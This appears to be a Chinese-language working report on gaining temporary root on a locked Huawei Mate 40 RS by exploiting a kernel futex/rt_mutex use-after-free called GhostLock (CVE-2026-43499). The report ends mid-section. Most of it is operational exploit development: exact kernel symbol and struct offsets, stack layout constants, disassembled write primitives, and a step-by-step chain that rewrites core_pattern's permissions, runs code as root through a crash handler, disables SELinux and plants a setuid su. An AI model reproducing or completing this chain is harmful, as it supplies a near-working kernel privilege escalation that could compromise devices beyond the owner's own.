# Mate 40 RS 临时 Root 可行性报告

> 目标：本机 USB 连接的 HUAWEI Mate 40 RS（NOP-AN00 / NOP-AN01P），目标为「临时 root」
> 采集方式：adb / fastboot / 设备内 `/proc`、`/sys` 实读 + 设备内已有工作台文件审计
> 结论一句话：**常规路线（解锁BL→Magisk/KernelSU）已被这台机器的 fastboot 硬关死；唯一可行的是内核 LPE（GhostLock CVE-2026-43499），而这项工作在这台机器上已经进行到最后一公里，但偏移档与本机运行内核不匹配，需要先修这个。**

---

## 1. 设备指纹（实测）

| 项 | 值 | 来源 |
|---|---|---|
| 型号 | NOP-AN00（产品 NOP-AN01P / device `HWNOP`） | `ro.product.model` |
| 系统 | HarmonyOS 4.2.0.196（`NOP-AN01P 4.2.0.196(C786E182R8P6)`） | `ro.build.display.id` |
| AOSP 基线 | Android 12 / SDK 31，SPL 2021-10-05 | `ro.build.version.*` |
| SoC | kirin9000（Kirin 9000） | `ro.board.platform` |
| 内核 | **Linux 5.10.43 aarch64**，构建于 **2026-08-20 18:03 CST** | `/proc/version` |
| 安全性 | `ro.secure=1`、`ro.debuggable=0`、`ro.adb.secure=1` | getprop |
| 启动链 | `ro.boot.flash.locked=1`、`verifiedbootstate=green`、`veritymode=enforcing` | getprop |
| SELinux | `Enforcing`，policyvers 33，`context=u:r:shell:s0` | `getenforce` / `id` |
| 分区 | `/`、`/vendor` 为 **erofs 只读**，`/data` 为 f2fs rw | `mount` |
| su | 不存在（`/system/bin/su`、`/system/xbin/su`、`/sbin/su` 全部 No such file） | `ls` |
| ADB 身份 | `uid=2000(shell)`，组含 `inet/readproc/uhid` | `id` |

有用的内核配置（`/proc/config.gz`，shell 可读）：
`CONFIG_USER_NS=y`、**`CONFIG_FUTEX_PI` 相关的 PI 路径存在**、`CONFIG_NF_TABLES=y`（仅 IPV6）、`CONFIG_OVERLAY_FS=y`、`CONFIG_FUSE_FS=y`、`CONFIG_KALLSYMS(_ALL)=y`、**`CONFIG_IO_URING` 未编入**、**`CONFIG_USERFAULTFD` 未编入**、`CONFIG_KPROBES` 未编入。

> 这一条很关键：`IO_URING`/`USERFAULTFD` 关闭，直接废掉一批常见 Android LPE（io_uring 系列、userfaultfd 系列）；`KPROBES` 关闭废掉 kprobe 型利用。

---

## 2. 已排除的路线（含实测证据）

### 2.1 Bootloader 解锁 —— 死路，且是「硬死」
实机进 fastboot 后（`adb reboot bootloader` → `fastboot` 35.0.2）：

```
fastboot getvar product        -> FAILED (remote: 'Command not allowed')
fastboot getvar unlocked       -> FAILED (remote: 'Command not allowed')
fastboot getvar secure         -> FAILED (remote: 'Command not allowed')
fastboot oem device-info       -> FAILED (remote: 'Command not allowed')
fastboot oem get_unlock_code   -> FAILED (remote: 'Command not allowed')
fastboot oem unlock            -> FAILED (remote: 'invalid command')
fastboot oem unlock-go         -> FAILED (remote: 'invalid command')
fastboot flashing unlock       -> FAILED (remote: 'invalid command')
fastboot oem frp-unlock        -> FAILED (oem_frp_check_password failed)
```

判读：
- `flashing unlock` / `oem unlock` 返回的是 **`invalid command`（不是 not allowed）** → 这台机器的 fastboot **根本没编入解锁指令**，不是"策略禁止"，是"能力不存在"。
- 连 `getvar` 这类只读命令都 `Command not allowed` → 锁定态下 fastboot 仅保留极小白名单（`reboot` 可用，已用它回系统）。
- 华为 2018-07 已关闭官方解锁码申请；Kirin 9000（Mate 40 系列）**没有公开可用的解锁码/算法**。市面上"一键解锁/淘宝解锁码"对 NOP 无效。

**推论（被判死刑的路线）**：Magisk patch boot.img 刷入、KernelSU、LSPosed、TWRP 卡刷、`fastboot flash boot`、`fastboot boot`（临时内核）——全部需要解锁 BL 或可写分区，全部不可行。强行 `fastboot flash` 只会撞 verity/green 变成软砖（只能靠 HiSuite/eRecovery 救）。

### 2.2 服务/系统层"伪 root" —— 不存在
- 无 `su`、无 `magisk`、无 debug 属性；`ro.debuggable=0`。
- `PR_SET_MM_MAP` 在 shell 下直接 `EPERM`（见 `chk.txt`），`process_vm_readv` `EPERM/EACCES`，`vmsplice` 参数被拒 —— 一批无 CAP 的捷径不可用。
- 华为的 `hdbd` 存在但不可读不可用（`ls: /system/bin/hdbd: Permission denied` 是 SELinux 拦截）。

### 2.3 已测过的公开漏洞链
- **BadSpin（CVE-2022-20421，binder UAF）**：`bs.log` 显示 `A: 1 references accepted` → `A: Done sending transaction. BR_FAILED_REPLY`，且没有出现 `badcab1ebadcab1e` 命中 → **目标路径已补，不可用**。
- **Dirty Pipe（CVE-2022-0847）**：`dpipe_test` + `dp_target` 已就位（17:38 刚测过），未见结论落盘；即便可用，Android 12 + erofs/verity 下还需一个"root 会执行/读取"的落点，属于可利用但落地麻烦。
- **Towelroot 型 futex（CVE-2014-3153）/ perf 信息泄漏（CVE-2013-2094）**：内核 2.x/3.x 时代产物，5.10 无意义，仅被当作侧信道/寄存器泄漏工具在用（`perf_leak`、`perf_regs`、`regs*.txt`）。

---

## 3. 唯一可行路线：GhostLock（CVE-2026-43499）

### 3.1 为什么是它
- 15 年老洞：`kernel/locking/rtmutex.c` 的 `remove_waiter()` 在 **requeue-PI 代理路径**上清错了任务的 `pi_blocked_on`，waiter 返回用户态时 `pi_blocked_on` 仍指向已释放的内核栈帧 → 栈 UAF。
- 触发条件：**只需要普通线程 + futex 系统调用，无 CAP、无 namespace**；唯一要求 `CONFIG_FUTEX_PI=y`（本机满足）。
- 影响范围：Linux 2.6.39 ~ 7.1，**5.10.43 在范围内**。
- 公开链路（kernelCTF 获奖）：prefetch 泄漏 KASLR/physmap → 制造 dangling waiter → 用 `PR_SET_MM_MAP` 的 `user_auxv`（或等价的受控内核栈帧）回收 → **一次受限写**（rtmutex rb-tree erase 把 CEA 指针存进 `inet6_protos[IPPROTO_UDP]`）→ 回环 IPv6 UDP 包劫持控制流进 CEA 上的 ROP → **DirtyMode**：一次写翻转 `core_pattern` 的 mode 位 → `core_pattern` 设 `|/path/script` → 触发任意进程崩溃 → **以 root 执行脚本**。

### 3.2 这台机器上的实际进度（`/data/local/tmp` 审计）
设备里已有一套相当大的工作台（100+ 文件，2026-11-04 ~ 11-08），说明这条路已经跑到中后段：

| 证据文件 | 含义 |
|---|---|
| `chain.txt` → `base=ffffff8174a9c000 agree=42`、`task=...`、`userns=...`、`P=... Pcred=... G=...` | **已拿到 physmap 基址 + task_struct/cred 指针** |
| `kaslr.txt` → `minpc=ffffffe6bdf1fe24 modecnt=25`；`uns`/`perf_leak` | **KASLR/侧信道泄漏已成型** |
| `o5.log` → `requeue_pi -> -1 errno=35(EDEADLK)` … `[*] sched_setattr -> 0` … `[*] SURVIVED` | **UAF 已触发、PI 链遍历触发器可用、且未 panic** |
| `a2.log` / `a3.log` → `32-bit overlay (compat pselect …) overlay_done=1` | **PR_SET_MM_MAP 被 EPERM 后改用 compat pselect 栈帧回收，已跑通** |
| `mark.txt` → `waiter_enter / waiter_leak_ok / stamp_enter / chain_enter` | 链路推进到 chain 阶段 |
| `chk.txt` → `prctl(PR_SET_MM_MAP_SIZE): EPERM` | 官方 reclaim 通道被 CAP_SYS_RESOURCE 挡住（因此走 overlay） |
| `task.txt` / `lt.txt` / `scan.txt` | 用 `comm`（off=0x7d8）指纹在栈堆里挑 task_struct |
| `glk/nop.conf`、`glk/p40.conf` | **本机内核符号偏移档**（`init_task`、`init_cred`、`selinux_enforcing`、`security_hook_heads`、`slide_*`） |
| `boot_nop.bin`（`ANDROID!`）、`nop_Image.bin`、`Image_4_0.bin` | 提内核镜像做静态偏移 |
| `ghostlock-extract`（ELF aarch64, NDK r30） | 自制的"从 Image 里抽符号/偏移"工具 |

偏移档内容（nop.conf）：
```
init_task = 57624960      init_cred = 57690320
empty_zero_page = 64122880    root_task_group = 64149376
selinux_enforcing = 65777768  selinux_blob_sizes = 42078344
security_hook_heads = 42076664
slide_nfulnl_logger = 57576032  slide_boot_id = 65973316  slide_loggers_0_1 = 57575832
kernelsnitch { collisions = 8, mm_struct_sz = 1024 }
recommend_shizuku = 0
```
注意这套偏移只到 `init_cred` / `selinux_enforcing` / `security_hook_heads` —— 说明计划里的落地手法是 **cred 覆写 + 关 SELinux（或 hook 表覆写）**，而不是公开 writeup 的 CEA+ROP 那条，属于更省事、更适合"临时 root"的定制路线。

### 3.3 **本次审计发现的致命问题（必须先修）**
设备里三个内核镜像的构建时间，和**实际运行的内核**不是同一个 build：

| 来源 | 内核构建时间 |
|---|---|
| 运行中内核 `/proc/version` | **Thu Aug 20 18:03:37 CST 2026** |
| `nop_Image.bin`（偏移档大概率来自它） | Tue Oct 21 11:10:12 CST 2025 |
| `Image_4_0.bin` | Fri Apr 26 13:47:07 CST 2024 |

并且：按 `nop.conf` 的 `init_task = 57624960` 去 `nop_Image.bin` 取字节，取到的是一片 `0xffffffc0…` 指针数组；而**整份镜像里 `strings` 搜不到 `swapper/0`**（`Linux version 5.10.43` 能搜到，偏移 47MB/50.6MB），说明该 offset 与 `init_task->comm` 的自校验**对不上**。

结论：
1. 静态偏移档 **与运行内核不匹配**（2025-10 build ≠ 2026-08 build），`init_task`/`init_cred`/`selinux_enforcing` 这些绝对偏移**大概率全错**；
2. 用错的偏移做写原语 = 直接写坏内核内存 = **必 panic（甚至 page-cache 脏数据）**；
3. 这也解释了为什么工作台里有大量 `TOPSCAN`/`scan*`/`task.txt` 的**动态重扫**痕迹 —— 链条卡在"静态档不可信"这一环。

---

## 4. 要拿到临时 root，接下来必须做的三件事

### 第 1 步：把偏移变成"运行时可信"（阻塞项）
两个选择，任选其一：

**A. 动态只读自校验（推荐，零风险）**
用已经跑通的 fake-waiter rb-tree 读原语，做**纯读**验证而不是直接写：
1. 用 `slide_*` 三个 oracle（`nfulnl_logger` / `boot_id` / `loggers[0..1]`）交叉解 KASLR slide，要求三者一致（`chain.txt` 里 `agree=42` 就是这个思路，扩到多 oracle）。
2. 用 `init_task + 0x??` 读 `comm`，比对 `"swapper/0"`；用 `init_cred` 读 `usage=4 / uid=0 / gid=0 / securebits / cap_*` 形状校验。
3. 只有 "comm 命中 + cred 形状命中" 才认为偏移可用；否则在镜像里用 `ghostlock-extract` 重新签名扫描（注意：要拿 **2026-08 build** 的 kernel，不是手上这两个旧包）。

**B. 抓对版本的内核**
从当前固件（4.2.0.196 / C786E182R8P6）对应的 OTA/`dload` 包里取 `kernel`，或另想办法拿到 2026-08 build 的 Image，再重新生成 profile。

### 第 2 步：落地原语（写一到两次）
按 `nop.conf` 的偏移清单，目标是：
- `selinux_enforcing = 0`（拿到 SELinux permissive，后面所有事都简单）；
- 当前进程 `task->cred` 指向 `init_cred`，或把 `cred->{uid,gid,euid,egid,suid,sgid,fsuid,fsgid,cap_*}` 全清零；
- 备选：`security_hook_heads` 覆写绕过（一次性、但更容易崩）。

写成功后立刻验：`id` 是否 `uid=0`、`getenforce` 是否 `Permissive`。

### 第 3 步：把 root 做成「临时」形态（不动 /system，不碰 verity）
拿到 root 后**不要**去 remount `/system`（erofs ro + verity，改了就软砖）。只在内存/tmpfs 里建 root 环境：
```sh
# 1) 关 SELinux（若还没关）
setenforce 0

# 2) tmpfs 里放 su，重启即消失 = 真正的"临时 root"
mkdir -p /data/local/tmp/r && mount -t tmpfs tmpfs /data/local/tmp/r
cp /data/local/tmp/su_static /data/local/tmp/r/su && chmod 4755 /data/local/tmp/r/su

# 3) 起一个 root daemon（可选，给 App 用）
/data/local/tmp/r/su --daemon &
# 或用 Shizuku：用 root 起 shizuku_server，App 侧直接用 Shizuku API 拿系统级权限
```
需要 `su` 二进制的话：编译一份静态 aarch64 的最小 su（或从 Shizuku/Magisk 的 `su` 移植），**不要**去 patch boot.img。

---

## 5. 现在就能用的「准 root」能力（不用等内核链）

在真 root 拿到之前，`uid=2000(shell)` 已经能做很多事，配合 Shizuku 能覆盖绝大多数"我要 root 干什么"的需求：

```sh
# 应用管理
adb shell pm disable-user --user 0 <pkg>      # 冻结/禁用（含系统应用）
adb shell pm uninstall --user 0 <pkg>          # 卸载系统应用（当前用户）
adb shell pm clear <pkg>
adb shell am force-stop <pkg>

# 权限/AppOps（比 root 更精细）
adb shell pm grant  <pkg> <permission>
adb shell pm revoke <pkg> <permission>
adb shell appops set <pkg> RUN_IN_BACKGROUND ignore
adb shell appops set <pkg> WAKE_LOCK ignore

# 显示/分辨率/DPI（很多人 root 就为这个）
adb shell wm size 1228x2700
adb shell wm density 480
adb shell wm size reset && adb shell wm density reset

# 网络/电量/调试
adb shell cmd netpolicy add restrict-background <uid>
adb shell settings put global captive_portal_mode 0
adb shell dumpsys battery set level 100
adb shell svc wifi disable / enable
```
**Shizuku**（把 shell 权限借给 App，免 root）：装 Shizuku 后用 `adb shell sh /sdcard/Android/data/moe.shizuku.privileged.api/start.sh` 起服务，之后 冰箱/黑洞/MT管理器/Scene/AppOpsX 等一大批"root 工具"可走 Shizuku 模式工作 —— 这是华为锁定机上事实上的标准"临时 root 替代"。
**虚拟机方案**：VMOS / 光速虚拟机 / Termux + proot 可以在用户态跑一个带"假 root"的 Linux，适合需要 root shell 环境跑工具的场合。

---

## 6. 风险与红线

1. **不要刷任何分区**（boot/system/vbmeta）：`flash.locked=1` + `green` + `verity enforcing`，失败即软砖，只能 HiSuite/eRecovery 救。
2. GhostLock 是**内核栈 UAF**：写错偏移 = panic/重启；写到 page cache（Dirty Pipe 同理）= 数据可能脏，重启后消失但期间可能损坏文件。**动手前备份重要数据**，确认能进 eRecovery。
3. 这套东西**每次重启全丢**（正是"临时 root"的语义）；不会有持久化风险，也不要去尝试持久化。
4. 当前工作台里 `nop.conf` 的偏移**不可直接用于写**（见 §3.3），先做 §4 第 1 步的只读校验。

---

## 6.5 关于"要不要系统镜像"（补充实测）

结论：**要的不是"系统镜像"，而是"与运行内核同一版的内核镜像"；而手上所有镜像的版本都比运行内核旧。**

### 本机已有的固件资产（扫描所得）
| 文件 | 体积 | 版本 | 内核构建时间 |
|---|---|---|---|
| `Downloads\华为mate40rs-NOP-AN01P 4.2.0.192-256.zip` + 同名解包目录 | 7.7 GB / 13.3 GB | 4.2.0.192 分区组 dump（`THR925GFCV100HAE20251210095403`，2025-12-10） | **2025-10-21** |
| └ `Lun_3_P57_boot.bin` | 30 MB | boot 分区（`ANDROID!`，kernel 23.66 MB gzip） | 同上 |
| └ `Lun_3_P75_super.bin` | 7.24 GB | dynamic super（system/vendor/product…，erofs） | — |
| └ `Lun_3_P76_version.bin` / `P72_patch.bin` / … | 576 MB / 256 MB | version/patch 等 80 余个分区 | — |
| `Downloads\NOP-AN00_102.0.0.165(C00E160R8P2)_Firmware_HarmonyOS_2.0.0_05016QDY.zip` | 6.0 GB | HarmonyOS 2.0.0 整包 | — |
| `Downloads\NOP-AN00-AN00P-AN01P_HarmonyOS3_0_0_opensource_tar.gz` | 572 MB | **内核源码**（`Code_Opensource/kernel/…`，`merge_baltimore_defconfig`，4.19/clang-r353983c 时代） | — |
| 设备 `/data/local/tmp/boot_nop.bin` | 30 MB | = `Lun_3_P57_boot.bin` | 2025-10-21 |
| 设备 `/data/local/tmp/nop_Image.bin` | 70.5 MB | = 上述 boot 解出的 kernel | 2025-10-21 |
| 设备 `/data/local/tmp/Image_4_0.bin` | 70.1 MB | 另一份提取 | 2024-04-26 |
| **设备实际运行内核** | — | `4.2.0.196 (C786E182R8P6)` | **2026-08-20** |

### 同源校验（MD5，已实测一致）
```
Lun_3_P57_boot.bin  == boot_nop.bin          -> 9636ae7af0cebbe4b25881e0ad1a57d1
解出的 kernel       == nop_Image.bin         -> 22d80e9d08571875581df3faf3664963   (73921012 B, banner@50610948)
```
→ **`glk/nop.conf` 的偏移就是这套 4.2.0.192（2025-10-21）内核的**，与运行中的 2026-08-20 内核不是同一 build。这就是 §3.3 的根因，已被证实。

### 各镜像对本次任务的实际价值
- **内核镜像**：只有"版本对"时才能提供静态符号偏移 → 当前的都不对，**不能用于写原语**。
- **系统镜像（super/erofs）**：对偏移无用；用途只有两个 —— (a) 抽 `/system/etc/selinux` 策略与文件布局，规划提权后 su 落地方式；(b) 万一搞成 bootloop，这是唯一恢复依据（BL 锁定，只能走官方救砖通道）。
- **内核源码 tar.gz**：能给 `task_struct` / `cred` 结构体布局做参照，但那版是 4.19 时代，与 5.10 有差异，只能参考不能照抄。

### 因此只有两条路
- **路 B（推荐，先做，不需要任何镜像）**：运行时自校准。用已跑通的读原语在 physmap 扫 `"swapper/0"` 指纹定位真实 `init_task`，用 3 个 `slide_*` oracle 交叉定 KASLR slide，再用 `init_cred` 的 `usage/uid/cap` 形状做校验。完全绕开版本问题，且是**纯读**，零 panic 风险。
- **路 A（补镜像）**：拿到 `4.2.0.196` 那版的 boot。途径只有三条：华为 OTA 接口（`query.hicloud.com` 网络可达，但要过签名/设备校验流程）、第三方固件站、或者从设备读 `/dev/block/sdd57`（实测 `brw------- root root` + `block_device` 标签，shell 读不了 → 需要 root，鸡生蛋）。

### 顺带排除
`Downloads\852 华为解BL锁神器`（256 MB）、`华为解bl`（397 MB）这类工具对 NOP 无效 —— fastboot 连 `getvar` 都 `Command not allowed`、`flashing unlock` 直接 `invalid command`，工具再花哨也没有可调用的解锁指令通道。不用在它们上面浪费时间。

---

## 3.6 复核结果（**推翻 §3.3 的结论**，2026-11-08 实测）

### 3.6.1 拿到与运行内核同版本的镜像
`<workspace>\Lun_3_P57_boot.bin`（`rawprogram0..3.xml` 配套的整机分区 dump）：
- md5 `0c3785924a8dc2ff3cefcd60566d30cd`（≠ Downloads 里 2025-10 那份 `9636ae7a…`）
- 内嵌 kernel 73,921,204 B，banner：`#1 SMP PREEMPT Thu Aug 20 18:03:37 CST 2026`
- 与设备 `/proc/version` **完全一致** → 这份就是运行内核。

### 3.6.2 偏移档其实是对的
本机 `CONFIG_KALLSYMS_ALL=y` + `CONFIG_KALLSYMS_BASE_RELATIVE=y`，镜像自带完整 kallsyms。
用 `vmlinux-to-elf` 还原出 **213,390 个符号**，与 `glk/nop.conf` 逐项比对：

| key | nop.conf | 镜像实测 | delta |
|---|---|---|---|
| init_task | 57624960 | 57624960 | **0** |
| init_cred | 57690320 | 57690320 | **0** |
| empty_zero_page | 64122880 | 64122880 | **0** |
| root_task_group | 64149376 | 64149376 | **0** |
| selinux_blob_sizes | 42078344 | 42078344 | **0** |
| security_hook_heads | 42076664 | 42076664 | **0** |
| slide_nfulnl_logger | 57576032 | 57576032 | **0** |
| slide_loggers_0_1 | 57575832 | 57575816（`loggers`） | -16 |
| selinux_enforcing | 65777768 | 65777768（实为 **`selinux_state`**） | 0 |

→ **§3.3 "偏移与运行内核不匹配" 的推断作废**（当时依据是"镜像里搜不到 `swapper/0` 字面量"，属误判；该符号在镜像中确实不以明文字符串形式存在）。
→ 只有一处真实缺陷：`selinux_enforcing` 这个 key 名对应的是 `selinux_state` 结构体基址，`enforcing` 是其**成员**（不是基址本身），清零时需按结构体内偏移写。

### 3.6.3 GhostLock 漏洞确认存活
反编译 `remove_waiter`（`0xffffffc0101a25f0`）：
```
mrs  x19, sp_el0            ; x19 = current
add  x21, x19, #0x8d4       ; &current->pi_lock
... spin_lock(&current->pi_lock) ...
str  xzr, [x19, #0x900]     ; current->pi_blocked_on = NULL  ← 清的是 requeuer，不是 waiter
```
修补后的上游实现应写 `waiter->task->pi_blocked_on`。这里是 `current` → **CVE-2026-43499 未修，可利用**。

### 3.6.4 落地所需的完整常量表（全部静态解析所得）
符号偏移（相对 `_text`，运行时 = 该值 + KASLR slide）：
| 符号 | offset(hex) |
|---|---|
| `_text` | 0（运行时基址 `0xffffffc010000000 + slide`） |
| `init_task` | `0x36f4980` |
| `init_cred` | `0x37048d0` |
| `selinux_state` | `0x3ebb068` |
| `security_hook_heads` | `0x28209f8` |
| `selinux_blob_sizes` | `0x2821088` |
| `inet6_protos` | `0x36f2ab0` |
| `core_pattern` | `0x3ac3108` |
| `modprobe_path` | `0x36d0388` |
| `empty_zero_page` | `0x3d27000` |
| `root_task_group` | `0x3d2d780` |
| `nfulnl_logger` | `0x36e8a60`（slide oracle） |
| `loggers` | `0x36e8988`（slide oracle，旧档差 16） |
| `swapper_pg_dir` | `0x3303000` |
| `init_nsproxy` | `0x3704760` |
| `init_mm` | `0x3ab7720` |

结构体偏移（从 `remove_waiter` / `task_blocks_on_rt_mutex` / `__arm64_sys_getuid` / `getresuid` 反汇编取得）：
| 字段 | 偏移 |
|---|---|
| `task_struct.piplock` → 精确名 `pi_lock` | `0x8d4` |
| `task_struct.pi_blocked_on` | `0x900` |
| `task_struct.cred` | `0x800` |
| `task_struct.real_cred` | `0x7f8`（推得） |
| `task_struct.prio` | `0x124` |
| `cred.uid` / `gid` / `suid` / `sgid` | `0x4` / `0x8` / `0xc` / `0x10` |
| `cred.euid` / `egid` / `fsuid` / `fsgid` | `0x14` / `0x18` / `0x1c` / `0x20` |
| `cred.securebits` | `0x24` |
| `cred.cap_inheritable` / `permitted` / `effective` / `bset` / `ambient` | `0x28` / `0x30` / `0x38` / `0x40` / `0x48` |
| `cred.user_ns` | `0x88` |
| `rt_mutex_waiter.task` | `0x30` |
| `rt_mutex_waiter.lock` | `0x38` |
| `rt_mutex_waiter.prio` | `0x48` |
| `rt_mutex_waiter.deadline` | `0x50` |

→ 这套表足以直接构造 fake `rt_mutex_waiter`、做 `task->cred` 覆写或 `selinux_state.enforcing=0` 落地。

---

## 3.7 工作台二进制反编译结论（2026-11-08）

设备上 7 个 `ghostlock*` 文件已全部拉回 `_work\ghostlock\`，逐个定性：

| 文件 | 类型 | 作用 | 状态 |
|---|---|---|---|
| `ghostlock-extract` | ELF aarch64，**Rust 2.2MB** | 内核偏移档生成器：从镜像/BTF 推 `pselect_waiter_shift`、`multicast waiter_off`、credential 偏移，输出 `glk/*.conf` | 可用 |
| `ghostlock_oracle` | ELF aarch64 116KB | 探针：判定 waiter 是否真的留在内核态（UAF 是否成立）、`FUTEX_CMP_REQUEUE_PI` 探测 | 可用 |
| `ghostlock_overlay` / `overlay2` | ELF aarch64 ~116KB | pselect overlay 探针（早期版） | 可用 |
| `ghostlock_overlay5` | ELF aarch64 120KB | 最新探针：**leak → overlay 回收 → sched_setattr 链遍历 → SURVIVED** | 可用 |
| `ghostlock_poc` | **全零文件**（熵 0.00） | 占位/预分配，非程序 | 无内容 |
| `ghostlock_arm_dyn` | **全零文件** | 同上 | 无内容 |

**结论：工作台里没有任何"写原语 / 提权落地"阶段。** 全部二进制里都搜不到 `core_pattern` / `modprobe_path` / cred 写入 / `su` / `exec` 相关字符串 —— 最后一击从没写过，这是当前唯一缺口。

### 3.7.1 已跑通的链路（`overlay5` 反汇编实证）
`main`（0x530）流程：
1. 选模式 `safe` / `anchor` / `safe-bail`（argv），打印 `[*] mode=%s (pselect overlay, waiter=W-0x220)`
2. `pthread_create` 出 waiter 线程（0xe60）
3. perf 泄漏：`perf_event_open(nr=241)` → 采样内核 SP → `[leak] tid=%d samples=%d max_sp=%016llx`
4. 计算布局（见下）
5. `futex(FUTEX_CMP_REQUEUE_PI=6)` → `futex(FUTEX_WAIT_REQUEUE_PI=11)` → **UAF**
6. `pselect6(nr=72, nfds=320)` 的 fd_set 栈缓冲**覆盖**被释放的 waiter 帧 → `[*] overlay_done=1`
7. `sched_setattr(nr=274)` 触发 PI 链遍历，解引用悬空 `pi_blocked_on` → `[*] SURVIVED`

`waiter_fn`（0xe60）实证细节：
- `gettid`(nr=178) 存共享区 `+0x10`
- 起 2s 超时轮询等主线程
- 自旋 `ldar` 等 `[+0x14]` 非零
- `futex(uaddr=+0xc, op=6)` CMP_REQUEUE_PI 预热，置 `[+0x00]=1`
- 构造 `timespec{sec=now+5}`，`futex(uaddr=+0x18, op=11, val=0, timeout, uaddr2=+0x04)` **WAIT_REQUEUE_PI** ← 这里产生要释放的 `rt_mutex_waiter`
- `pselect6(nfds=0x140, readfds=+0x20, writefds=+0x48, exceptfds=+0x70, timeout=0.6s)`
- 置 `[+0xa0]=1`，自旋等 `==2` 与主线程会合

### 3.7.2 内核栈布局常数（本机实测校准值）
```
top         = leaked_kernel_SP & ~0x3fff      (16KB 内核栈)
W           = top - 0x150
pselect_buf = top - 0x350   (= W - 0x200)
waiter      = top - 0x370   (= W - 0x220)
```
`pselect6` 的 `nfds=0x140` → 每个 fd_set 40 字节（5 qwords），三个 fd_set 共 **15 qwords（0x78B）** 落在 `pselect_buf..+0x78`，即覆盖 `waiter+0x20 .. waiter+0x98`。

因此把 `struct rt_mutex_waiter` 的字段对齐到被覆盖区间：

| waiter 字段 | waiter 偏移 | 落在 pselect_buf+ | qword 索引 |
|---|---|---|---|
| `pi_tree_entry` | 0x18 | 0x18 | 3（与 lock 冲突，见下） |
| **`task`** | **0x30** | **0x10** | **2** |
| **`lock`** | **0x38** | **0x18** | **3** |
| `prio` | 0x48 | 0x28 | 5 |
| `deadline` | 0x50 | 0x30 | 6 |

⇒ **`pselect_waiter_shift = 2`**（与 `ghostlock-extract` 里 "max feasible shift is 3" 的约束一致，且是唯一能让 `task/lock` 落进 15 个可控 qword 的取值）。

### 3.7.3 缺口：那一次受控写
公开链路（NebuSec/kernelCTF）是把 `rt_mutex_dequeue → rb_erase` 在伪造节点上产生的**指针写入**打到 `inet6_protos[IPPROTO_UDP]`（本机偏移 `0x36f2ab0`），再从回环 IPv6 UDP 劫持控制流到 CEA 上的 ROP，最后用一次写翻转 `core_pattern` 的 mode 位（DirtyMode）。

本机可选的两条落点：
- **A. cred 覆写**（`glk/nop.conf` 的原意，`ghostlock-extract` 里也有 "5.x credential derivation"）：把受控写导向当前 task 的 `cred`（`task_struct+0x800`）或其字段，直接 `uid=0` + `cap_effective=0x3fffffffff`。
- **B. DirtyMode + `core_pattern`**（`0x3ac3108`）：写 `|/data/local/tmp/x %P`，再触发任意崩溃拿 root 执行。

需要补的代码就是：把 15 个 qword 拼成 fake waiter（`task`=某个真实 task 指针或可控指针，`lock`=目标锁指针），在 `sched_setattr` 触发前后控制时机，并把 rb_erase 的写导向落点。

---

## 3.8 落点选择与写入原语语义（2026-11-08，已定）

### 3.8.1 选择：B（DirtyMode → `core_pattern`）
| | 目标地址 | 写入值 | 是否需要泄漏 task/cred | 复杂度 |
|---|---|---|---|---|
| A. cred 覆写 | 当前 task 的 `task+0x800` | `&init_cred` | **需要**（task_struct 地址不能从 SP 推导） | 高 |
| **B. DirtyMode** | `_text + 0x370132c`（纯 slide 可算） | `0x1b6`（常量 0o666） | **不需要** | 低 |

B 同时具备两个决定性优势：
1. **地址与值都是常量**，不依赖任何额外泄漏；
2. **崩溃容忍**：ROP 只需一条 store（甚至可以直接用 rb_erase 的写完成，无需控制流劫持），其余全部在用户态完成。

### 3.8.2 `core_pattern` 的 ctl_table（精确定位）
```
kern_table[33] @ 0xffffffc013701318     （_text + 0x3701318）
  procname = "core_pattern"
  data     = 0xffffffc013ac3108   (== core_pattern, _text + 0x3ac3108)
  maxlen   = 128
  mode     = 0o644   @ 0xffffffc01370132c     ← 写目标（_text + 0x370132c），u16
```
翻成 `0o666`（`0x1b6`）后，非特权进程即可写 `/proc/sys/kernel/core_pattern`。

### 3.8.3 `rb_erase` 的写入语义（从本机内核机器码推出）
`rb_node` 布局：`__rb_parent_color@0x00`、`rb_right@0x08`、`rb_left@0x10`。

`remove_waiter` 里 `bl rb_erase(0xffffffc010b01ffc)`，进树删除时（`node->rb_left == NULL` 分支）：
```
ldr  x9,  [x0]              ; parent = node->__rb_parent_color (& ~3)
ldr  x12, [x11, #0x10]!     ; x12 = parent->rb_left
sub  x13, x11, #8           ;       &parent->rb_right
cmp  x12, x0
csel x11, x11, x13, eq      ; 选出“原本指向 node 的槽”
str  x8,  [x11]             ; ★ *slot = child
```
以及 `rb_set_parent_color` 形态：
```
ldr x12,[x8]; and x12,x12,#1; orr x12,x12,x9; str x12,[x8]   ; 保留 color 位后写入
```
⇒ 原语为 **“把 8 字节指针写到一个由 fake waiter 字段推导出的地址”**：
- `target = parent + 0x10`（或 `+0x08`，由 `[parent+0x10] == node` 是否成立决定）
- `value  = node->rb_right`（或 `node->rb_left`）
- `parent`、`value` 均来自 `pselect` 覆盖进去的 15 个可控 qword

字段到 qword 的映射（`pselect_waiter_shift = 2`）：
| waiter 偏移 | 字段 | qword 索引 |
|---|---|---|
| 0x00 / 0x08 / 0x10 | `tree_entry`(parent_color/right/left) | 0 / 1 / 2（与 task 冲突，需按分支选择） |
| 0x30 | `task` | 2 |
| 0x38 | `lock` | 3 |
| 0x48 | `prio` | 5 |
| 0x50 | `deadline` | 6 |

### 3.8.4 落地步骤（B 路线）
1. 跑 leak：`perf_event_open` 拿内核 SP → `top = SP & ~0x3fff` → `slide`（用 `nfulnl_logger`/`loggers` oracle 交叉验证）
2. 算 `core_pattern_mode = _text + slide + 0x370132c`
3. waiter 线程：`CMP_REQUEUE_PI` → `WAIT_REQUEUE_PI` 制造 UAF 帧
4. `pselect6(nfds=0x140)` 把 15 qword 覆盖进去，摆出 fake waiter，使 `rb_erase` 的 `*slot = 0x1b6` 落在 `core_pattern_mode`
5. `sched_setattr` 触发 PI 链遍历 → 解引用 fake waiter → `rb_erase` 执行那次写
6. 用户态：`echo '|/data/local/tmp/x %P' > /proc/sys/kernel/core_pattern`
7. 触发任意进程崩溃 → 以 root 执行 `/data/local/tmp/x`
8. root 脚本：`setenforce 0`；`mount -t tmpfs tmpfs /data/local/tmp/r`；放静态 `su`（4755）；`su --daemon`；重启即失效 = 临时 root

---

## 3.9 泄漏原语实测（2026-11-08，本轮新代码）

工具链打通：`pip install ziglang` → `python -m ziglang cc -target aarch64-linux-musl -static` → 设备上直接跑（uid=2000）。源码在 `_work\gl\`。

### 3.9.1 内核栈布局：已通 ✔
`gl_leak.c`（perf `PERF_SAMPLE_REGS_INTR`，寄存器掩码 bit31=SP / bit32=PC）实测输出：
```
